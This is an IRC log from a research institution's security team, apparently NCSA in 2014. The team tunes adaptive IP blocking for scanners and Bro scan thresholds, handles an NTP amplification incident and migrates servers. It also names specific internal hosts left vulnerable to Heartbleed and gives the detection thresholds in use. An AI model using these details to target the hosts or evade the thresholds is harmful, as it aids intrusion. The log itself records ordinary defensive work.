2014-07-28 13:51:43	jazoff	it's not..
2014-07-28 13:52:06	jazoff	was though, it expired
2014-07-28 13:52:11	wardog	ah.
2014-07-28 13:52:36	jazoff	Jul 27 13:16:31 cygnus BHR_BLOCK: IP=81.177.22.106 HOSTNAME=null WHO=bro WHY="SSH::Subnet_Scanner: 81.177.22.106 scanned 4 subnets" UNTIL=1406485891 DURATION=900
2014-07-28 13:52:43	jazoff	Jul 27 14:17:48 cygnus BHR_BLOCK: IP=81.177.22.106 HOSTNAME=null WHO=bro WHY="SSH::Subnet_Scanner: 81.177.22.106 scanned 4 subnets" UNTIL=1406493116 DURATION=4448
2014-07-28 13:52:53	wardog	Can we have that lookup in ninfo?
2014-07-28 13:53:05	jazoff	yeah.. that's easy enough to do
2014-07-28 13:53:10	jazoff	can either pull from splunk or from bhr DB
2014-07-28 13:53:22	jazoff	bhr DB probably better but the api for that is kinda non existant :)
2014-07-28 13:53:29	wardog	probably both so we have check on discrepancies.
2014-07-28 13:53:54	wardog	ah, is this the adaptive blocking code?
2014-07-28 13:54:02	jazoff	yeah
2014-07-28 15:19:46	jazoff	ninfo bhrhistory 187.149.212.193
2014-07-28 15:19:47	ncsabot	Error running plugin
2014-07-28 15:19:51	jazoff	oh, bounce server
2014-07-28 15:19:59	jazoff	ninfo bhrhistory 187.149.212.193
2014-07-28 15:20:00	ncsabot	<14>Jul 28 15:19:09 cygnus BHR_BLOCK: IP=187.149.212.193 HOSTNAME=dsl-187-149-212-193-dyn.prod-infinitum.com.mx WHO=bro WHY="Scan::Address_Scan: 187.149.212.193 scanned at least 37 unique hosts on port 23/tcp in 0m8s" UNTIL=1406579649 DURATION=900
2014-07-28 15:40:13	jazoff	wardog: https://portal-sec.internal.ncsa.edu/static/ninfo/index.html#/single/81.177.22.106 
2014-07-28 15:40:16	jazoff	now with history :)
2014-07-28 15:42:23	wardog	cool
2014-07-28 15:42:44	jazoff	pretty easy to make splunk based plugins since there is a helper class for it
2014-07-29 08:56:35	jazoff	hmm, I think the bhr scaling stuff needs more work
2014-07-29 08:56:43	jazoff	still see hosts getting blocked for 15 minutes every few hours
2014-07-29 08:57:30	jazoff	could be that it should be counting the number of recent blocks, not just the age of the most recent one
2014-07-29 09:02:59	jazoff	hmm, the host i was looking at is getting blocked every 8 hours
2014-07-29 09:22:11	jazoff	though when it works it has been working well, one host got blocked for 15 minutes a few times, and then 4,17,70 hours
2014-07-29 09:36:37	jazoff	ah, I think I just need something to set the minimum time modifier age to 1 day
2014-07-29 09:36:57	jazoff	or like 12 hours
2014-07-29 09:41:18	soehlert	wait why would a host get blocked for 15 minutes multiple times? shouldnt it jump up after the first one? or are they waiting long enough in between getting blocked (i presume its a short time since it's based on how long they were blocked)
2014-07-29 09:44:19	jazoff	they are waiting long enough
2014-07-29 09:44:34	jazoff	if they wait more than 15*8 they just got blocked for 15 again
2014-07-29 09:44:53	jazoff	I just changed it to be min(1 day, 8 * last block time)
2014-07-29 09:44:55	soehlert	gotcha. didnt know the actual math behind that one. 
2014-07-29 09:45:03	soehlert	ah i like that idea
2014-07-29 09:45:35	jazoff	so this way as long as they scan again teh same day they will get blocked an hour the second time, then 4 hours...
2014-07-29 09:46:02	jazoff	then after that the min thing won't matter
2014-07-29 09:52:10	jazoff	oh, derr, that should be max
2014-07-29 09:52:54	jazoff	ok, take 2
2014-07-29 10:06:50	jazoff	seems to be working
2014-07-29 10:06:59	jazoff	will be able to tell better tomorrow morning
2014-07-29 10:15:06	eyrich	increasign the minimum time of a block negates the whole point of self correcting false positive
2014-07-29 10:16:12	eyrich	never i mind i see, minumim look back time
2014-07-29 10:16:19	eyrich	that should probably be a variable
2014-07-29 10:22:55	jazoff	it should be, and it is :)
2014-07-29 10:23:09	jazoff	minimum_time_window:43200.0
2014-07-29 10:29:16	eyrich	ok cool
2014-07-29 10:29:35	eyrich	thoughts on max block time variable?
2014-07-29 10:29:58	eyrich	maybe 2yr
2014-07-29 10:33:35	soehlert	probably a good idea
2014-07-29 10:38:58	jazoff	hmm
2014-07-29 10:39:05	jazoff	easy enough to add
2014-07-29 10:42:00	soehlert	Just in case the IP space rolls over to someone new eventually we dont' wanna screw them over.
2014-07-29 11:27:36	keist	Is everyone fine with git-sec being down for about an hour? I'm ready to migrate it to CentOS, I would prefer to do it now then to do it later this evening since we can all test
2014-07-29 11:28:16	soehlert	im trying to figure out this environment thing, but if you can get it up in an hour thats fine
2014-07-29 11:28:53	keist	jazoff: 
2014-07-29 11:34:17	jazoff	yeah, no problems here
2014-07-29 11:36:31	keist	kk, will do after lunch
2014-07-29 12:04:25	keist	turning it off now
2014-07-29 12:14:36	eyrich	did you schedule DT in nagios?
2014-07-29 12:15:14	jazoff	based on #nagios I'm guessing no :)
2014-07-29 12:31:21	keist	ah crap, sorry forgot about it
2014-07-29 12:31:27	keist	git-sec is back up
2014-07-29 12:31:51	keist	the new one, let me know if there's any problems. I am able to pull a repo just find after accepting the SSH key fingerpint
2014-07-29 12:32:02	keist	s/pull/clone
2014-07-29 12:35:02	keist	able to push too
2014-07-29 12:39:02	keist	err, web interface was working but isn't now :/
2014-07-29 12:47:27	keist	working again, redis was having issues
2014-07-29 12:54:48	 *	keist going for a walk, bbl
2014-07-29 13:13:39	soehlert	jazoff: how do we update the links on the portal again? puppet link points to squall
2014-07-29 13:15:56	jazoff	go to /admin
2014-07-29 13:19:53	soehlert	k thanks
2014-07-29 14:06:43	<--	keist (jschipp@hidden-E95C13A8.ncsa.illinois.edu) has quit (Ping timeout)
2014-07-30 08:01:55	jazoff	bhr scaling working much better now
2014-07-30 08:02:07	jazoff	the hosts that were getting blocked over and over finally did...
2014-07-30 08:02:23	jazoff	900 900 900 900 900 900 900 900 [code update] 4700 20000 81000
2014-07-30 08:06:39	eyrich	looking back at your comments yesteray, I think it might be a good idea to count number of blocks within the look back windo
2014-07-30 08:07:15	jazoff	not sure if that would add any benfit at this point
2014-07-30 08:07:30	jazoff	I think it's doing exactly what we want now :)
2014-07-30 08:09:01	eyrich	ya maybe, i have concerns about the repeat scanners getting blocked for the minimum, now we have just shifted that from 2 hours to 1 day
2014-07-30 08:09:18	jazoff	hmm?
2014-07-30 08:09:52	jazoff	repeat scanners still go from 15 minutes to 1 hour to 4 hours to 16 hours
2014-07-30 08:10:22	jazoff	there is just a minimum initial lookback time of 12 hours
2014-07-30 08:10:46	eyrich	oh 12 hours, i thought it was 24. 
2014-07-30 08:11:06	jazoff	yeah, I set it to 12
2014-07-30 08:13:02	eyrich	im thinking maybe we can get better reactions if we include past block counts within the look back window. as we are including more historical behavior
2014-07-30 08:13:49	jazoff	well the problem was it finding even 1 recent block in the look back window
2014-07-30 08:14:06	jazoff	with the minimum of 12 hours now it should always find the previous scan
2014-07-30 08:14:33	eyrich	right - use  really large look back windows multiplier , and then also multiple the penlaty by the count
2014-07-30 08:14:34	jazoff	and the 4x multiplier does it's thing if it comes back after getting unblocked the second time, so I think all the bases are covered
2014-07-30 08:14:58	jazoff	I think the math would work out the same
2014-07-30 08:15:11	jazoff	since the 4x multiplier compounds at each block
2014-07-30 08:15:39	eyrich	right, we needed to set a minimum to get past the slow start. 
2014-07-30 08:16:22	eyrich	ok, i can go with that and see how it works out
2014-07-30 08:17:06	jazoff	yeah, I _think_ it's good now, but the best way to see is just wait another day and see what the counts look like
2014-07-30 08:17:22	jazoff	right now if I do a count by ip for the last 7 days in splunk there are hosts that have been blocked 10+ times
2014-07-30 08:17:49	jazoff	which should be closer to 5 if things were working right
2014-07-30 08:18:00	jazoff	one host was blocked 16 times
2014-07-30 08:18:25	jazoff	but now it finally scaled in the lsat 3, so it's blocked for 22 hours
2014-07-30 08:23:45	eyrich	i went to block that phalax we just got and bro beat me to it :)
2014-07-30 08:26:43	jazoff	phalax?
2014-07-30 08:27:05	eyrich	its an alert triggered by a bad protoctol message by sshd
2014-07-30 08:27:11	jazoff	ooh
2014-07-30 08:27:31	jazoff	ah, i see it
2014-07-30 08:27:41	eyrich	previous large hack of terragrid and other large computing sites involved a trojaned sshd that opened up back doors when you sent it the right magic protocol version or something
2014-07-30 08:29:01	jazoff	ninfo bhrhistory 115.148.65.37
2014-07-30 08:29:02	ncsabot	<14>Jul 30 08:20:21 cygnus BHR_BLOCK: IP=115.148.65.37 HOSTNAME=null WHO=bro WHY="Scan::Port_Scan: 115.148.65.37 scanned at least 102 unique ports of host 141.142.234.1 in 0m2s" UNTIL=1406731165 DURATION=4744
2014-07-30 08:29:03	ncsabot	<14>Jul 30 05:10:02 cygnus BHR_UNBLOCK: IP=115.148.65.37 WHO=cronjob WHY="Block Time Expired"
2014-07-30 08:29:03	ncsabot	<14>Jul 30 04:50:16 cygnus BHR_BLOCK: IP=115.148.65.37 HOSTNAME=null WHO=bro WHY="Scan::Port_Scan: 115.148.65.37 scanned at least 102 unique ports of host 141.142.176.1 in 0m0s" UNTIL=1406714716 DURATION=900
2014-07-30 08:31:21	eyrich	can we make bro more sensative to single host unique port scans? 102 seems high
2014-07-30 08:31:29	eyrich	what is the default?
2014-07-30 08:32:11	jazoff	redef Scan::addr_scan_threshold = 35.0;
2014-07-30 08:32:12	jazoff	redef Scan::port_scan_threshold = 100.0;
2014-07-30 08:35:33	eyrich	thoughts on lowering? looks like the default is 15 on port scan
2014-07-30 08:35:41	jazoff	yeah, we bumped them up
2014-07-30 08:35:51	jazoff	but i have no problem lowering
2014-07-30 08:37:54	eyrich	50 ?
2014-07-30 08:37:56	eyrich	to start
2014-07-30 08:41:18	jazoff	changed
2014-07-30 09:05:10	eyrich	can you make it so the bhr emails have the duration listed?
2014-07-30 09:05:25	jazoff	the digest?
2014-07-30 09:08:17	eyrich	ya
2014-07-30 09:08:31	jazoff	should be able to.
2014-07-30 09:08:31	eyrich	maybe caluclate it 
2014-07-30 09:08:56	jazoff	yeah, i worked out the query to do that for the scaling
2014-07-30 09:09:20	jazoff	extract(epoch from (u.unblock_when - b.block_when)) as duration
2014-07-30 09:09:45	jazoff	though for just displaying there's no need to extract it as it will give you a duration type
2014-07-30 09:10:12	jazoff	oh wait, that's the wrong fields, that's after it has been unblocked
2014-07-30 09:10:25	 *	jazoff grumbles something about denormalization
2014-07-30 09:13:01	eyrich	so this one would calculate blocklist.blocklist_until - blocklog.block_when
2014-07-30 09:13:22	jazoff	yeah
2014-07-30 09:13:55	jazoff	just needs to be added to the block_notify_queue and unblock_notify_queue functions
2014-07-30 09:52:22	-->	keist (jschipp@hidden-E95C13A8.ncsa.illinois.edu) has joined #security
2014-07-30 09:52:32	eyrich	are the new nagios machines doign vmware time sync?
2014-07-30 09:52:59	keist	eyrich: yes
2014-07-30 09:53:17	eyrich	ok, I got the text at 9:52
2014-07-30 09:54:18	soehlert	9:51 here
2014-07-30 09:54:44	eyrich	getting errors on nagios2-sec and nagios-console-sec-centos, says wmare tools install is in progress
2014-07-30 09:55:03	eyrich	nagios-console-sec-centos is not set for time sync
2014-07-30 09:55:38	eyrich	neither is nagios-monitor-sec
2014-07-30 09:57:39	keist	hmm, I thought I set them all
2014-07-30 09:57:46	keist	I guess I missed two
2014-07-30 10:20:00	wardog	soehlert: regarding RT tickets. Apparently if you log in via campus credentials, not NCSA credentials, it logs you in via a DIFFERENT principal and you don't get the same permissions.
2014-07-30 10:33:32	soehlert	jesus christ this system is messed up
2014-07-30 11:15:12	keist	what system?
2014-07-30 11:15:39	soehlert	RT system
2014-07-30 11:15:50	soehlert	RE: what wardog just sent to me
2014-07-30 11:18:25	keist	ah
2014-07-30 11:18:32	keist	btw, git-sec web interface is fixed
2014-07-30 11:25:04	soehlert	cool
2014-07-30 12:02:51	keist	eyrich: I verified that relay01-sec is receiving UDP syslog messages, from a few hosts too
2014-07-30 12:03:54	keist	there are a few hosts not capable of sending anything other than UDP syslogs according to their admins which why I think limiting to just TCP syslog is a bad idea
2014-07-30 12:04:41	keist	3 examples I have are:
2014-07-30 12:04:41	keist	 141.142.192.57, # bw-wiki (bglick)
2014-07-30 12:04:41	keist	    141.142.224.25, # glass.teragrid.org (clindsey)
2014-07-30 12:04:44	keist	    141.142.242.85, # lgheron, Apple-Macbook Pro (arnoldg)
2014-07-30 12:07:21	jazoff	ok, lunch time
2014-07-30 12:10:29	jazoff	there is this: https://forge.puppetlabs.com/jay/console_env
2014-07-30 12:10:53	soehlert	take a look at our modules :)
2014-07-30 12:10:54	jazoff	er
2014-07-30 12:11:08	jazoff	oooh
2014-07-30 12:11:12	jazoff	have we always had that?
2014-07-30 12:11:22	soehlert	yup
2014-07-30 12:11:22	soehlert	thats how i got it working before
2014-07-30 12:11:24	jazoff	ahhh
2014-07-30 12:11:27	jazoff	cause it sas
2014-07-30 12:11:33	jazoff	THIS WILL ONLY WORK WITH PE 3.2.X >
2014-07-30 12:11:45	soehlert	and we're 3.3 which is bigger than 3.2.X
2014-07-30 12:11:53	jazoff	why didn't he write PE > 3.2.X ?
2014-07-30 12:11:59	jazoff	who writes it like that?
2014-07-30 12:12:08	soehlert	yah idk took me a second too
2014-07-30 12:12:15	jazoff	ok, so I just need to debug that the
2014-07-30 12:12:46	soehlert	i feel like he didn't test it with 3.3 and something changed there (dynamic environments?) so it doesn't work now
2014-07-30 12:12:46	soehlert	i kinda forgot that existed so maybe we can make it work
2014-07-30 12:17:54	jazoff	is that module enabled on the new puppet master?
2014-07-30 12:17:55	jazoff	i dont think it is
2014-07-30 12:18:32	jazoff	squall has the /etc/puppetlabs/puppet-dashboard/external_node file but puppet-sec doesn't
2014-07-30 12:19:10	soehlert	weird. i'll add it and see how that goes.
2014-07-30 12:20:48	soehlert	hmm puppet configs didnt autopull it seems
2014-07-30 12:20:49	jazoff	i bet that does it
2014-07-30 12:21:06	soehlert	ahhh error: Your local changes to 'puppet.conf' would be overwritten by merge.  Aborting.
2014-07-30 12:21:36	soehlert	did you comment out the manual envs on puppet-sec itself?
2014-07-30 12:21:56	jazoff	ooooooh maybe
2014-07-30 12:22:01	jazoff	:)
2014-07-30 12:22:46	soehlert	how do i ignore local changes again? git reset --head origin/master?
2014-07-30 12:22:56	jazoff	just git checkout puppet.conf; git pull
2014-07-30 12:23:00	jazoff	should do it
2014-07-30 12:23:18	soehlert	ah that musta been it.
2014-07-30 12:23:28	soehlert	now how do i pull everything?
2014-07-30 12:23:28	soehlert	git checkout configs?
2014-07-30 12:23:38	jazoff	noooo
2014-07-30 12:23:39	jazoff	just git pull
2014-07-30 12:23:43	soehlert	ok
2014-07-30 12:24:13	soehlert	console_env added
2014-07-30 12:25:49	soehlert	i think that worked
2014-07-30 12:26:35	jazoff	oh, hmm
2014-07-30 12:26:38	soehlert	nope..
2014-07-30 12:27:06	jazoff	yeah... /etc/puppetlabs/puppet-dashboard/external_node comes from puppet
2014-07-30 12:27:12	jazoff	and that doesn't exist on the new server
2014-07-30 12:27:33	soehlert	ah ya i see that now
2014-07-30 12:27:48	jazoff	wonder if it is there under a different filename
2014-07-30 12:28:01	soehlert	do you know what's supposed to be in there?
2014-07-30 12:28:53	jazoff	look on squall
2014-07-30 12:29:35	soehlert	weird, that's supposed to be put there by the manifest..i'll try it manually and see what happens
2014-07-30 12:29:52	jazoff	no... /etc/puppetlabs/puppet-dashboard/external_node is modified
2014-07-30 12:29:56	jazoff	it is expected to already exist
2014-07-30 12:30:08	soehlert	i see that now :)
2014-07-30 12:31:16	soehlert	grr
2014-07-30 12:32:09	jazoff	oh, /etc/puppetlabs/puppet-dashboard/external_node exists on puppet-sec
2014-07-30 12:32:11	jazoff	did you create it?
2014-07-30 12:32:14	soehlert	ya
2014-07-30 12:32:22	jazoff	oh, i doubt anything references it
2014-07-30 12:33:18	soehlert	i  file_line { 'console_env-external_node':
2014-07-30 12:33:18	soehlert	    ensure  => present,
2014-07-30 12:33:18	soehlert	    path    => '/etc/puppetlabs/puppet-dashboard/external_node',
2014-07-30 12:33:37	jazoff	nother than the console_env module
2014-07-30 12:33:55	soehlert	oh. well the console env is all we care about for that right?
2014-07-30 12:34:14	jazoff	no
2014-07-30 12:34:29	jazoff	the console_env module hacks up the external_node file to fix the yaml thing being structured wrong
2014-07-30 12:34:38	jazoff	but something else in puppet used that /etc/puppetlabs/puppet-dashboard/external_node file
2014-07-30 12:34:51	soehlert	oooo
2014-07-30 12:35:20	jazoff	oh, maybe not
2014-07-30 12:35:26	jazoff	i don't se it referenced by name anywhere
2014-07-30 12:35:52	soehlert	hmm
2014-07-30 12:42:11	jazoff	yeah, i have no idea what in the last version ever used that external_node script
2014-07-30 12:42:38	soehlert	meh to be honest, i'm fine with just setting it in puppet.conf on the agents..
2014-07-30 12:43:07	soehlert	i think i didnt get how that worked at first and wanted to like the WUI, now..
2014-07-30 12:43:38	jazoff	yeah
2014-07-30 12:58:26	jazoff	so, we should be good to go now?
2014-07-30 13:00:43	soehlert	yup just use puppet.conf on the agent
2014-07-30 13:13:30	wardog	still playing catchup from being gone. No whiparound today.
2014-07-30 14:43:05	jazoff	eyrich: digest should now show how long something is blocked for
2014-07-30 14:47:58	eyrich	nice , thanks
2014-07-30 14:48:22	jazoff	ooo
2014-07-30 14:48:26	jazoff	just realized I only did it for blocks
2014-07-30 14:48:30	jazoff	did we want it for unblocks too?
2014-07-30 14:58:34	eyrich	i guess for consitancy it would be nice
2014-07-30 14:59:10	jazoff	ok, just need to work out the query
2014-07-30 14:59:38	eyrich	should be the same query as the last block time you did for variable pana,ty
2014-07-30 15:00:00	jazoff	yeah
2014-07-30 15:12:19	jazoff	ok
2014-07-30 15:12:37	jazoff	should maybe revisit the bhr digest email format, it's kinda busy
2014-07-30 15:15:33	keist	anyone know what machine is using 10.142.148.33? It's not documented and I was going to use the address but another machine responds with ARP replies
2014-07-30 15:31:23	eyrich	switch descrioption for the port the mac comes from is:  Description: nids-33 eth2 on 10.142.148.0 network
2014-07-30 15:32:12	eyrich	its a physical HP box
2014-07-30 15:32:15	eyrich	in rack 1
2014-07-30 15:32:28	eyrich	or with a connection to rack 1's switch
2014-07-30 15:38:37	jazoff	oh, don't those not exist anymore?
2014-07-30 15:38:56	jazoff	oh wait, they do, they just don't have the tapped ports
2014-07-30 15:45:28	keist	ah, thanks for looking that up
2014-07-31 09:21:17	wardog	Sent you guys an email about SANS vouchers. Please read and respond either here for via email
2014-07-31 09:21:57	jazoff	i could never find a relevant course I was interested in
2014-07-31 10:02:29	keist	I'd like to use one if it's not taken from staff dev funds
2014-07-31 10:07:16	soehlert	wardog: no need for me. i'm gonna hold off on certs for now and just eventually take classes to keep the ones i have now
2014-07-31 10:08:22	wardog	soehlert: even if it's paid for?
2014-07-31 10:09:01	soehlert	ehhh if theres a free one i'll use it, but dont order one special for me
2014-07-31 10:12:05	wardog	I worked it out where we can order 2 per year. You guys just work out who uses them
2014-07-31 10:17:45	soehlert	ah that works
2014-07-31 10:21:29	keist	I think it's down to soehlert and I, jazoff sees nothing of interest that's relevant and eyrich usually doesn't care (but will have to confirm this time)
2014-07-31 10:21:54	soehlert	probably. i suppose i can always take the follow up class to this one.
2014-07-31 10:27:33	wardog	Another option would be to just do these every 2 years
2014-07-31 10:52:04	jazoff	bhr auto scaling working much better now
2014-07-31 10:53:50	wardog	jazoff: so, maybe a good step down the road would be to push those blocks into CIF and use the scale to give a confidence level for the IP?
2014-07-31 10:56:53	jazoff	i was definitely thinking of doing the reverse..
2014-07-31 10:57:05	jazoff	using the confidence level of any ips already in CIF to scale the initial block time
2014-07-31 10:57:41	wardog	That makes more sense currently.
2014-07-31 10:58:33	wardog	If, down the road, we federate CIF with UIUC or someone else then pushing our blocks into it would make more sense.
2014-07-31 11:02:04	jazoff	definitely
2014-07-31 14:51:25	wardog	so, there's a screw up with ordering the SANS vouchers. So, instead of spending the next few hours sorting it out, we'll just take a break for the year and pick it up again next year.
2014-07-31 14:52:41	wardog	In lieu of sans training, who's interested in going to DerbyCon?
2014-07-31 14:55:59	soehlert	not particularly
2014-07-31 16:02:58	keist	wardog: I'm interested
2014-07-31 16:03:47	soehlert	jazoff: bhr adaptive seems to be going well just was checking on 115.148.109.221 in ninfo..
2014-07-31 16:05:11	jazoff	yeah, it's looking good
2014-08-01 11:25:39	keist	jazoff: what's the packer repo URL?
2014-08-01 12:13:35	wardog	soehlert: what's the name of the new xsede wiki server?
2014-08-01 12:14:04	soehlert	wiki-sec
2014-08-01 12:14:23	soehlert	you can cname it for that if you want, but for our purposes it's wiki-sec
2014-08-01 12:35:40	jazoff	ah, forgot to eat lunch 
2014-08-01 12:45:01	wardog	not surprising
2014-08-01 12:47:11	soehlert	wish i was at home. i need more lunch..
2014-08-01 12:53:39	wardog	which is the original xsede wiki server?
2014-08-01 12:53:42	wardog	snow? zephyr?
2014-08-01 12:53:46	soehlert	snow
2014-08-01 12:53:57	wardog	what's zephyr then?
2014-08-01 12:54:20	soehlert	grid-sec
2014-08-01 12:54:26	wardog	sigh... right
2014-08-01 13:09:10	wardog	Is the mediawiki stuff on wiki-sec just on the host and not in git?
2014-08-01 13:09:30	soehlert	yes
2014-08-01 13:11:35	wardog	k. I'm gonna upgrade the mediawiki software on wiki-se
2014-08-01 13:11:36	wardog	c
2014-08-01 13:11:40	soehlert	ok
2014-08-01 13:56:11	wardog	Someone shoot that printer
2014-08-01 14:02:49	soehlert	as soon as it actually prints my stuff out
2014-08-01 14:06:42	wardog	So was mod_ssl not installed on wiki-sec?
2014-08-01 14:06:52	soehlert	i thought i had it on there
2014-08-01 14:07:05	wardog	mod_ssl is not installed.
2014-08-01 14:07:14	soehlert	hmm ok well go for it then
2014-08-01 14:07:39	wardog	Do I just do that on th ehost or through puppet?
2014-08-01 14:07:48	wardog	Or is wiki-sec not puppetized?
2014-08-01 14:08:03	soehlert	host. wiki stuff is not at all puppetized
2014-08-01 14:08:03	soehlert	just basic stuff like users and firewalls
2014-08-01 14:08:14	wardog	k
2014-08-01 14:08:18	wardog	easy enough
2014-08-01 15:22:54	wardog	Ok. Need 443 opened on wiki-sec and ops-security.xsede.org cname changed to wiki-sec.ncsa.illinois.edu
2014-08-01 15:24:26	wardog	And 80 closed on wiki-sec
2014-08-01 15:28:13	soehlert	pushed the rules, but im gonna need to move wiki-sec over to using the new puppet server
2014-08-01 15:28:23	soehlert	think you need neteng for the cname part too 
2014-08-01 15:28:41	wardog	right. I'll send the request.
2014-08-01 15:30:40	jazoff	brb, dog walk
2014-08-01 15:46:39	wardog	Just the wiki on snow right?
2014-08-01 15:46:51	soehlert	huh?
2014-08-01 15:46:54	wardog	Should probably be able to drop it as soon as the cname gets changed.
2014-08-01 15:47:05	soehlert	oh and by the way the fw stuff is fixed
2014-08-01 15:47:12	wardog	yep, just tested.
2014-08-01 15:47:22	soehlert	what is just the wiki on snow?
2014-08-01 15:47:37	wardog	Is the wiki all that was on snow.
2014-08-01 15:48:09	soehlert	idk if the xsede irc stuff was on there too or not
2014-08-01 15:48:14	soehlert	err jabber or whatever it is
2014-08-01 15:48:20	wardog	No that's on blizzard.
2014-08-01 15:49:43	soehlert	then ya its just the wik
2014-08-01 16:16:32	soehlert	wardog: im gonna put my foot down if basney and terry want me to create a rhn repo here just for emacs...not gonna happen
2014-08-01 16:31:08	jazoff	heh
2014-08-01 17:55:21	jazoff	wait.. why do they need emacs on the servers?
2014-08-04 08:55:23	wardog	emacs? wtf.
2014-08-04 09:23:02	keist	?
2014-08-04 09:24:16	jazoff	keist: look 3 lines up
2014-08-04 09:32:25	wardog	basney and terry, emacs...
2014-08-04 09:45:29	jazoff	so, BHR working well
2014-08-04 09:45:54	jazoff	only see 77 hosts that showed up twice that did not get scaled, they seem to be because they have a delay of almost a day
2014-08-04 09:47:44	jazoff	compared to 722 that worked ok
2014-08-04 10:17:41	jazoff	hmm, some new hosts are online that are vulnerable to heardbleed
2014-08-04 10:18:08	jazoff	eyrich: has qualys found these?
2014-08-04 10:18:20	jazoff	info 141.142.234.78 bro_notice
2014-08-04 10:18:38	jazoff	er
2014-08-04 10:18:46	jazoff	info bro_notice 141.142.234.78
2014-08-04 10:19:54	jazoff	oh, derr
2014-08-04 10:19:57	jazoff	ninfo bro_notice 141.142.234.78
2014-08-04 10:19:57	ncsabot	Time: 2014-08-04 03:14:09.019 CDT
2014-08-04 10:19:58	ncsabot	Notice: SSL::Invalid_Server_Cert
2014-08-04 10:19:58	ncsabot	SRC IP: 162.251.84.151
2014-08-04 10:19:58	ncsabot	DST IP: 141.142.234.78
2014-08-04 10:19:58	ncsabot	MSG: SSL certificate validation failed with (unable to get local issuer certificate)  
2014-08-04 10:19:58	ncsabot	SUB: unstructuredName=1404833515\,564d7761726520496e632e,CN=pkirack8.ncsa.uiuc.edu,emailAddress=ssl-certificates@vmware.com,OU=VMware ESX Server Default Certificate,O=VMware\, Inc,L=Palo Alto,ST=California,C=US  
2014-08-04 10:20:10	jazoff	so, some "pki" related thing running ESX is vuln.. fun
2014-08-04 10:21:33	jazoff	141.142.234.147 isct.ncsa.illinois.edu too
2014-08-04 10:25:21	jazoff	looks like it's just those 2 and one more: 141.142.223.77  141.142.234.147 141.142.234.78
2014-08-04 11:12:12	wardog	jazoff: did you get logs into a git incident report for the NTP issue?
2014-08-04 11:17:26	jazoff	oh, no, will do that
2014-08-04 11:17:36	jazoff	I did get (i think) a udp DoS policy working
2014-08-04 11:17:54	jazoff	eventually realized the bulk connection detector I wrote for the arista stuff was exactly what we needed
2014-08-04 11:18:49	jazoff	just getting up to make lunch, will get that ntp thing written up right after
2014-08-04 11:19:09	wardog	thanks
2014-08-04 11:21:10	jazoff	I made a 212_208_ntp_dos profile in nfsen for that host
2014-08-04 12:08:25	jazoff	do we know who the end user for that system is?
2014-08-04 12:08:30	jazoff	don't know who to tell that we null routed it
2014-08-04 12:18:45	wardog	dnsworks says slevy
2014-08-04 12:18:49	wardog	I'll send an email
2014-08-04 13:51:36	jazoff	eyrich: can you easily run another remote ntp sweep?
2014-08-04 13:57:39	eyrich	jazoff: running
2014-08-04 14:25:46	jazoff	ah, took a look at the test instance of suricata i've had running
2014-08-04 14:25:54	jazoff	that actually did something useful for the ntp attack
2014-08-04 14:26:16	jazoff	08/04/2014-13:57:19.058849  [**] [1:2017919:2] ET DOS Possible NTP DDoS Inbound Frequent Un-Authed MON_LIST Requests IMPL 0x03 [**] [Classification: Attempted Denial of Service] [Priority: 2] {UDP} 192.223.27.241:27015 -> 141.142.212.208:123
2014-08-04 14:26:27	jazoff	08/04/2014-03:59:54.045433  [**] [1:2017921:2] ET DOS Possible NTP DDoS Multiple MON_LIST Seq 0 Response Spanning Multiple Packets IMPL 0x03 [**] [Classific
2014-08-04 14:26:30	jazoff	ation: Attempted Denial of Service] [Priority: 2] {UDP} 141.142.212.208:123 -> 94.236.58.252:5816
2014-08-04 14:27:10	jazoff	of course it doesn't look like it detects that the attack is working
2014-08-04 15:05:18	jazoff	eyrich: did you say we have a box we can use for remote port scans?
2014-08-04 15:05:26	jazoff	I want to set something up to validate our iptables/firewall rules
2014-08-04 15:05:42	jazoff	not so much a vulnerability scanner, but just verify that things that should be limited to 141.142 are actually limited to 141.142
2014-08-04 15:08:43	jazoff	ok, walk time
2014-08-04 16:49:57	keist	jazoff: does the PCAP you recorded have an NTP monlist request in it? If so, where can I get it? I'd like to write a trafgen configuration for that attack.
2014-08-04 16:50:56	keist	also, do we all have access to the suricata machine? what's its address?
2014-08-04 16:51:09	jazoff	it's running on nids-dev1
2014-08-04 16:51:28	jazoff	i built an rpm for it but no init script yet
2014-08-04 16:51:47	jazoff	though really all it needs to be more "production" is init script and splunk config
2014-08-04 16:52:03	jazoff	keist: also, I have a pcap that I generated a while ago that has a single monlist query in it
2014-08-04 16:52:11	keist	can you send it to me?
2014-08-04 16:52:40	jazoff	threw it in /tmp on fog
2014-08-04 16:52:44	jazoff	ntp_monlist.pcap
2014-08-04 16:52:48	keist	kk, thanks!
2014-08-04 16:55:13	keist	are we getting a dedicated machine for suricata? it's just getting a 1/4 of the traffic being on nids-dev1 right?
2014-08-04 16:58:52	jazoff	the plan was to just run it on all the machines
2014-08-04 16:58:58	jazoff	should be plenty of cores for both
2014-08-04 16:59:22	keist	kk
2014-08-04 17:02:56	keist	Are you familiar with Sguil? It would be really nice to have the alert data available to our workstations in real-time (sguil client). 
2014-08-04 17:03:11	jazoff	well, splunk can stream alerts
2014-08-04 17:03:38	keist	what do you mean by stream?
2014-08-04 17:06:26	jazoff	you can do a realtime search
2014-08-04 17:09:05	keist	ah, of course. Sguil provides packet details and contextual data too (by data from pulling from PADS, p0f, etc.).
2014-08-04 17:10:22	jazoff	i'll take a look
2014-08-04 17:10:29	jazoff	often those tools can be an operational nightmare
2014-08-04 17:13:00	keist	nah, not sguil, I would say, it's also pretty popular in the NSM community. The only difficult part is setting it up. I set it up while at my former employer, boss loved it. 
2014-08-04 17:14:19	keist	there's a TCL script available to put OSSEC alerts in the sguil console too for more context
2014-08-05 08:00:03	eyrich	jazoff: no at this time "we" don't have a box. I have access to a campus/uc2b host
2014-08-05 08:00:39	eyrich	I'm sure I can get something hosted on campus or iccn IP space if we have a host to take to them.
2014-08-05 08:01:39	jazoff	could we just pay for a small VPS for $5/mo ?
2014-08-05 08:04:53	jazoff	well, I suppose I could write the program first :)
2014-08-05 08:05:14	eyrich	it would probably be easier to have one of our old servers installed on campus
2014-08-05 08:05:22	eyrich	monthly reoccuring is kind of a pain
2014-08-05 08:05:46	eyrich	if its not going to be band width heavy we could look at putting it at Hoopeston
2014-08-05 08:06:14	jazoff	not bandwidth heavy, just some port probes
2014-08-05 08:11:04	jazoff	ah, apparently I wrote this program 5 years ago
2014-08-05 08:12:47	jazoff	just need to update a bit
2014-08-05 08:27:05	eyrich	what OS would you prefer?
2014-08-05 08:27:44	eyrich	fully open public IP ok?
2014-08-05 08:36:45	jazoff	will just be a python program so any unix should be fine
